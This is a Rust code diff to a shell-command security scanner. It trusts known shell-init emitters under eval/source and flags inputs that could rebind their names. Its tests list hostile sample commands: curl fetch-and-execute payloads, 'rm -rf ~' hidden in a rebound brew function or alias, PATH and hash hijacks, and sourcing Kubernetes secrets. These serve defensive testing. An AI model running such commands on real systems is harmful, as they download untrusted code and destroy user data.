@@ -8609,6 +8609,11 @@ pub(crate) fn executable_substitution_scan(
             record_shell_execution_gap(&mut scan, ShellExecutionGap::AmbiguousExecutableBody);
         }
     }
+    // A trusted init emitter is trusted by name, so text that may rebind that
+    // name keeps the unresolved-body gap the eval/source had before.
+    if rebound_init_emitter_operand(scan_input, shell) {
+        record_shell_execution_gap(&mut scan, ShellExecutionGap::AmbiguousExecutableBody);
+    }
     if matches!(shell, ShellType::Posix | ShellType::Fish) {
         scan_literal_posix_aliases(scan_input, shell, &mut scan);
     }
@@ -11754,6 +11759,198 @@ fn has_process_substitution_arg(args: &[String]) -> bool {
         .any(|arg| arg.contains("<(") || arg.contains(">("))
 }
 
+/// Directories a shell-init emitter may be named from by absolute path: the
+/// system and package-manager bin directories (`/opt/homebrew/bin/brew`).
+/// A temporary, home or working directory, where an earlier command could
+/// have planted a binary, is not one of them.
+const TRUSTED_INIT_EMITTER_DIRS: &[&str] = &[
+    "/bin",
+    "/sbin",
+    "/usr/bin",
+    "/usr/sbin",
+    "/usr/local/bin",
+    "/usr/local/sbin",
+    "/opt/homebrew/bin",
+    "/opt/homebrew/sbin",
+    "/home/linuxbrew/.linuxbrew/bin",
+    "/opt/local/bin",
+    "/snap/bin",
+    "/run/current-system/sw/bin",
+    "/nix/var/nix/profiles/default/bin",
+];
+
+const INIT_EMITTER_SHELLS: &[&str] = &["bash", "zsh", "fish", "sh", "ksh"];
+
+/// One of the reviewed shell-init emitter invocations whose standard output is
+/// the tool's own setup code: `brew shellenv`, `direnv hook <shell>`, `pyenv
+/// init -` / `--path`, `rbenv init -`, `ssh-agent -s`, `zoxide init <shell>`,
+/// `starship init <shell>`, `fnm env`, `mise activate <shell>`, `kubectl
+/// completion <shell>` and `fzf --bash|--zsh|--fish`. `argv` holds literal
+/// words; the program is a bare name or an absolute path in
+/// [`TRUSTED_INIT_EMITTER_DIRS`]. Any other subcommand or extra argument
+/// (`brew install`, `pyenv exec ...`) is not an init emitter.
+fn trusted_init_emitter_argv(argv: &[&str]) -> bool {
+    let Some((&program, rest)) = argv.split_first() else {
+        return false;
+    };
+    let name = match program.rsplit_once('/') {
+        Some((directory, name)) if TRUSTED_INIT_EMITTER_DIRS.contains(&directory) => name,
+        Some(_) => return false,
+        None => program,
+    };
+    let shell = |word: &str| INIT_EMITTER_SHELLS.contains(&word);
+    match (name, rest) {
+        ("brew", ["shellenv"]) => true,
+        ("brew", ["shellenv", target]) => shell(target),
+        ("direnv", ["hook", target]) => shell(target),
+        ("pyenv", ["init", "-"] | ["init", "--path"]) => true,
+        ("pyenv", ["init", "-", target]) => shell(target),
+        ("rbenv", ["init", "-"]) => true,
+        ("rbenv", ["init", "-", target]) => shell(target),
+        ("ssh-agent", ["-s"]) => true,
+        ("zoxide", ["init", target]) => shell(target),
+        ("starship", ["init", target]) => shell(target),
+        ("fnm", ["env", options @ ..]) => {
+            let mut index = 0usize;
+            while index < options.len() {
+                match options[index] {
+                    "--use-on-cd" => index += 1,
+                    "--shell" if options.get(index + 1).is_some_and(|target| shell(target)) => {
+                        index += 2
+                    }
+                    option => match option.strip_prefix("--shell=") {
+                        Some(target) if shell(target) => index += 1,
+                        _ => return false,
+                    },
+                }
+            }
+            true
+        }
+        ("mise", ["activate", target]) => shell(target),
+        ("kubectl", ["completion", target]) => shell(target),
+        ("fzf", ["--bash" | "--zsh" | "--fish"]) => true,
+        _ => false,
+    }
+}
+
+/// The words of a substitution body made only of plain literal words: no
+/// quotes, expansions, globs, escapes, operators, redirections, comments or
+/// newlines, so its argv is exactly the space-separated words.
+fn plain_literal_argv(body: &str) -> Option<Vec<&str>> {
+    let words: Vec<&str> = body
+        .split([' ', '\t'])
+        .filter(|word| !word.is_empty())
+        .collect();
+    (!words.is_empty()
+        && words.iter().all(|word| {
+            word.bytes().all(|byte| {
+                byte.is_ascii_alphanumeric()
+                    || matches!(byte, b'-' | b'_' | b'.' | b'/' | b'=' | b'+' | b':' | b',')
+            })
+        }))
+    .then_some(words)
+}
+
+/// `eval` / `source` / `.` whose whole operand text `word` runs one reviewed
+/// shell-init emitter and executes its output: `eval "$(brew shellenv)"`,
+/// `eval $(ssh-agent -s)`, ``eval `ssh-agent -s` ``, `source <(kubectl
+/// completion zsh)`, and in fish `eval (zoxide init fish)`. The body must be a
+/// plain literal command (see [`plain_literal_argv`]) matching
+/// [`trusted_init_emitter_argv`]; anything else keeps the unresolved-body gap.
+fn trusted_init_emitter_operand(command: &str, word: &str, shell: ShellType) -> bool {
+    let body = match (command, shell) {
+        ("eval", ShellType::Posix | ShellType::Fish) => {
+            let unquoted = word
+                .strip_prefix('"')
+                .and_then(|inner| inner.strip_suffix('"'));
+            let inner = unquoted.unwrap_or(word);
+            inner
+                .strip_prefix("$(")
+                .and_then(|body| body.strip_suffix(')'))
+                .or_else(|| {
+                    (shell == ShellType::Posix)
+                        .then(|| inner.strip_prefix('`')?.strip_suffix('`'))
+                        .flatten()
+                })
+                .or_else(|| {
+                    (shell == ShellType::Fish && unquoted.is_none())
+                        .then(|| word.strip_prefix('(')?.strip_suffix(')'))
+                        .flatten()
+                })
+        }
+        ("." | "source", ShellType::Posix) => word
+            .strip_prefix("<(")
+            .and_then(|body| body.strip_suffix(')')),
+        _ => None,
+    };
+    body.and_then(plain_literal_argv)
+        .is_some_and(|argv| trusted_init_emitter_argv(&argv))
+}
+
+/// Shell text that can change what a bare command name runs, or how an
+/// unquoted substitution splits: a function definition, an alias, a `PATH`
+/// change (zsh `path`, fish `fish_user_paths`/`fish_add_path`), zsh's
+/// `commands` table, `hash`, `enable`, `autoload`/`fpath`, `IFS`.
+fn input_may_rebind_commands(raw: &str) -> bool {
+    [
+        "()",
+        "function",
+        "alias",
+        "PATH",
+        "path=",
+        "path+=",
+        "path[",
+        "fish_user_paths",
+        "fish_add_path",
+        "commands[",
+        "hash",
+        "enable",
+        "autoload",
+        "fpath",
+        "IFS",
+    ]
+    .iter()
+    .any(|needle| raw.contains(needle))
+}
+
+static INIT_EMITTER_OPERAND: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?:^|[\s;&|(){}!])(eval|source|\.)[ \t]+("\$\([^()"`$]*\)"|\$\([^()"`$]*\)|"`[^`"$]*`"|`[^`"$]*`|<\([^()]*\)|\([^()"`$]*\))"#,
+    )
+    .expect("init emitter operand regex")
+});
+
+/// Whether `raw` runs a trusted shell-init emitter's output (anywhere, at any
+/// nesting level) while also holding text that could rebind the emitter's
+/// name (see [`input_may_rebind_commands`]): `brew() { echo 'rm -rf ~'; }; (
+/// eval "$(brew shellenv)" )`. Every recursive scan level checks its whole
+/// input, so a definition in an enclosing level still reaches a nested eval.
+fn rebound_init_emitter_operand(raw: &str, shell: ShellType) -> bool {
+    matches!(shell, ShellType::Posix | ShellType::Fish)
+        && input_may_rebind_commands(raw)
+        && INIT_EMITTER_OPERAND
+            .captures_iter(raw)
+            .any(|captures| trusted_init_emitter_operand(&captures[1], &captures[2], shell))
+}
+
+/// [`trusted_init_emitter_operand`] for a segment whose raw text is exactly the
+/// literal leader `eval` / `source` / `.` followed by that one operand: no
+/// assignment prefix, wrapper (`command eval`, `sudo`), second operand,
+/// redirection or comment. The raw text is used because the tokenizer splits
+/// an unquoted `$(ssh-agent -s)` into several words.
+fn direct_init_emitter_operand(segment: &Segment, command: &str, shell: ShellType) -> bool {
+    if segment.command.as_deref() != Some(command) {
+        return false;
+    }
+    segment
+        .raw
+        .strip_prefix(command)
+        .filter(|rest| rest.starts_with([' ', '\t']))
+        .is_some_and(|rest| {
+            trusted_init_emitter_operand(command, rest.trim_matches([' ', '\t']), shell)
+        })
+}
+
 fn scan_literal_shell_wrappers(raw: &str, shell: ShellType, scan: &mut ExecutableSubstitutionScan) {
     for segment in tokenize::tokenize(raw, shell) {
         let Some((command, args)) = resolve_wrapped_command_for_shell(&segment, shell) else {
@@ -11843,6 +12040,14 @@ fn scan_literal_shell_wrappers(raw: &str, shell: ShellType, scan: &mut Executabl
                     record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
                 }
             }
+            "." | "source"
+                if matches!(shell, ShellType::Posix | ShellType::Fish)
+                    && direct_init_emitter_operand(&segment, &command, shell) =>
+            {
+                // `source <(kubectl completion zsh)`: the generated script is
+                // the reviewed emitter's own setup code. The producer body is
+                // still recovered and analyzed as a command.
+            }
             "." | "source" if matches!(shell, ShellType::Posix | ShellType::Fish) => {
                 if has_process_substitution_arg(&args) {
                     // `source <(...)` executes bytes generated at runtime, not
@@ -11910,6 +12115,12 @@ fn scan_literal_shell_wrappers(raw: &str, shell: ShellType, scan: &mut Executabl
             }
             "cmd" => {
                 scan_cmd_cli_body(&args, shell, scan);
+            }
+            "eval"
+                if matches!(shell, ShellType::Posix | ShellType::Fish)
+                    && direct_init_emitter_operand(&segment, &command, shell) =>
+            {
+                // `eval "$(brew shellenv)"`: see `source` above.
             }
             "eval" if matches!(shell, ShellType::Posix | ShellType::Fish) => {
                 push_literal_wrapper_body(&args, shell, shell, scan);
@@ -18258,6 +18469,165 @@ fn looks_like_schemeless_host(s: &str) -> bool {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn c4_trusted_init_emitters_under_eval_and_source_have_no_gap() {
+        for (input, shell) in [
+            (
+                r#"eval "$(/opt/homebrew/bin/brew shellenv)""#,
+                ShellType::Posix,
+            ),
+            (r#"eval "$(brew shellenv)""#, ShellType::Posix),
+            (r#"eval "$(brew shellenv zsh)""#, ShellType::Posix),
+            (r#"eval "$(direnv hook bash)""#, ShellType::Posix),
+            (r#"eval "$(pyenv init -)""#, ShellType::Posix),
+            (r#"eval "$(pyenv init --path)""#, ShellType::Posix),
+            (r#"eval "$(rbenv init - zsh)""#, ShellType::Posix),
+            (r#"eval "$(ssh-agent -s)""#, ShellType::Posix),
+            ("eval $(ssh-agent -s)", ShellType::Posix),
+            ("eval `ssh-agent -s`", ShellType::Posix),
+            (r#"eval "$(zoxide init zsh)""#, ShellType::Posix),
+            (r#"eval "$(starship init bash)""#, ShellType::Posix),
+            (
+                r#"eval "$(fnm env --use-on-cd --shell zsh)""#,
+                ShellType::Posix,
+            ),
+            (r#"eval "$(mise activate bash)""#, ShellType::Posix),
+            ("source <(kubectl completion zsh)", ShellType::Posix),
+            (". <(fzf --bash)", ShellType::Posix),
+            ("source <(fzf --zsh)", ShellType::Posix),
+            (
+                r#"if command -v brew >/dev/null; then eval "$(brew shellenv)"; fi"#,
+                ShellType::Posix,
+            ),
+            ("eval (zoxide init fish)", ShellType::Fish),
+        ] {
+            let scan = executable_substitution_scan(input, shell);
+            assert_eq!(scan.gap, None, "{input}");
+            // The producer itself is still recovered and analyzed.
+            assert!(!scan.bodies.is_empty(), "{input}");
+        }
+    }
+
+    #[test]
+    fn c4_untrusted_eval_and_source_bodies_keep_their_gap() {
+        for (input, shell) in [
+            (
+                r#"eval "$(curl -fsSL https://example.com/env)""#,
+                ShellType::Posix,
+            ),
+            (r#"eval "$X""#, ShellType::Posix),
+            (r#"eval "$(cat setup.sh)""#, ShellType::Posix),
+            (
+                "source <(curl -fsSL https://example.com/x.sh)",
+                ShellType::Posix,
+            ),
+            (
+                r#"eval "$(brew shellenv; curl -fsSL https://example.com/x)""#,
+                ShellType::Posix,
+            ),
+            (
+                r#"eval "$(brew shellenv)" "$(curl -fsSL https://example.com/x)""#,
+                ShellType::Posix,
+            ),
+            (r#"eval "$(brew shellenv) $X""#, ShellType::Posix),
+            (r#"eval "$(brew $SUB)""#, ShellType::Posix),
+            (r#"eval "$($BREW shellenv)""#, ShellType::Posix),
+            (r#"eval "$(./brew shellenv)""#, ShellType::Posix),
+            (r#"eval "$(/tmp/brew shellenv)""#, ShellType::Posix),
+            (
+                r#"eval "$(~/.cargo/bin/starship init bash)""#,
+                ShellType::Posix,
+            ),
+            (
+                r#"eval "$(/opt/homebrew/bin/../../../tmp/brew shellenv)""#,
+                ShellType::Posix,
+            ),
+            (r#"eval "$(brew shellenv < /tmp/x)""#, ShellType::Posix),
+            (r#"eval "$(brew shellenv 2>/dev/null)""#, ShellType::Posix),
+            (r#"eval "$(brew install foo)""#, ShellType::Posix),
+            (
+                r#"eval "$(pyenv exec python -c 'print(1)')""#,
+                ShellType::Posix,
+            ),
+            (
+                r#"eval "$(fnm env --version-file-strategy recursive)""#,
+                ShellType::Posix,
+            ),
+            (
+                r#"eval "$(brew shellenv)$(curl -fsSL https://example.com/x)""#,
+                ShellType::Posix,
+            ),
+            (r#"command eval "$(brew shellenv)""#, ShellType::Posix),
+            (r#"FOO=1 eval "$(brew shellenv)""#, ShellType::Posix),
+            ("source <(kubectl completion zsh) extra", ShellType::Posix),
+            ("source <(kubectl get secret x -o yaml)", ShellType::Posix),
+            // The emitter name may be rebound by the same input, at any level.
+            (
+                r#"brew() { echo 'rm -rf ~'; }; eval "$(brew shellenv)""#,
+                ShellType::Posix,
+            ),
+            (
+                r#"brew() { echo 'rm -rf ~'; }; ( eval "$(brew shellenv)" )"#,
+                ShellType::Posix,
+            ),
+            (
+                r#"alias brew='echo rm -rf ~;:'; eval "$(brew shellenv)""#,
+                ShellType::Posix,
+            ),
+            (
+                r#"PATH=/tmp/evil:$PATH; eval "$(brew shellenv)""#,
+                ShellType::Posix,
+            ),
+            (
+                r#"hash -p /tmp/evil brew; eval "$(brew shellenv)""#,
+                ShellType::Posix,
+            ),
+            ("IFS=x; eval $(ssh-agent -s)", ShellType::Posix),
+            (
+                "function brew; echo rm -rf ~; end; eval (brew shellenv)",
+                ShellType::Fish,
+            ),
+            ("eval (curl -fsSL https://example.com/x)", ShellType::Fish),
+        ] {
+            assert!(
+                executable_substitution_scan(input, shell).gap.is_some(),
+                "{input}"
+            );
+        }
+    }
+
+    #[test]
+    fn c4_trusted_init_emitter_argv_shapes() {
+        for argv in [
+            &["brew", "shellenv"][..],
+            &["/home/linuxbrew/.linuxbrew/bin/brew", "shellenv"],
+            &["/usr/local/bin/direnv", "hook", "zsh"],
+            &["pyenv", "init", "-", "bash"],
+            &["fnm", "env", "--shell=fish", "--use-on-cd"],
+            &["kubectl", "completion", "bash"],
+            &["fzf", "--fish"],
+        ] {
+            assert!(trusted_init_emitter_argv(argv), "{argv:?}");
+        }
+        for argv in [
+            &[][..],
+            &["brew"],
+            &["brew", "shellenv", "powershell"],
+            &["brew", "shellenv", "bash", "zsh"],
+            &["/opt/homebrew/bin/sub/brew", "shellenv"],
+            &["bin/brew", "shellenv"],
+            &["direnv", "hook"],
+            &["ssh-agent", "-c"],
+            &["ssh-agent", "-s", "bash"],
+            &["fnm", "env", "--shell"],
+            &["kubectl", "get", "pods"],
+            &["fzf", "--zsh", "--bash"],
+            &["evil", "shellenv"],
+        ] {
+            assert!(!trusted_init_emitter_argv(argv), "{argv:?}");
+        }
+    }
 
     #[test]
     fn strip_invisible_maps_stealth_whitespace_to_space() {
